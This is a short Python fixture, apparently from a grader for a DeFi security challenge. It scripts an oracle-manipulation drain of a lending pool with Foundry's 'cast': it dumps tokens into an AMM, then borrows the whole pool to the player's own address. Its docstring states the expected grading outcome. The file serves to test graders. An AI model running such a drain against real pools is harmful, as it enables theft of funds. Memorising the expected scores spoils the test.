#!/usr/bin/env python3
"""Broken fixture: manipulate and drain correctly, but borrow the pool to
ourselves instead of the recovery address.

Expected: pool_emptied passes, funds_recovered fails. Score 40.
"""
import json
import subprocess
import sys
from pathlib import Path


def cast(*a):
    p = subprocess.run(["cast", *a], capture_output=True, text=True, timeout=120)
    if p.returncode != 0:
        sys.exit(f"cast failed: {p.stderr[:200]}")
    return p.stdout.strip().split()[0]


def send(rpc, key, to, *args, value=None):
    cmd = ["cast", "send", "--rpc-url", rpc, "--private-key", key, to, *args]
    if value is not None:
        cmd += ["--value", str(value)]
    subprocess.run(cmd, capture_output=True, text=True, timeout=120)


def main():
    p = json.loads(Path("params.json").read_text())
    rpc = p["rpc_url"]
    key = Path(p["key_file"]).read_text().strip()
    me = cast("wallet", "address", "--private-key", key)
    send(rpc, key, p["token"], "approve(address,uint256)", p["amm"], cast("max-uint"))
    send(rpc, key, p["amm"], "tokenToEth(uint256)", str(p["player_dvt"]))
    amount = str(p["pool_tokens"])
    req = cast("call", "--rpc-url", rpc, p["pool"], "requiredCollateral(uint256)(uint256)", amount)
    send(rpc, key, p["pool"], "borrow(uint256,address)", amount, me, value=req)  # to self
    print("drained to self, not recovery")


if __name__ == "__main__":
    main()
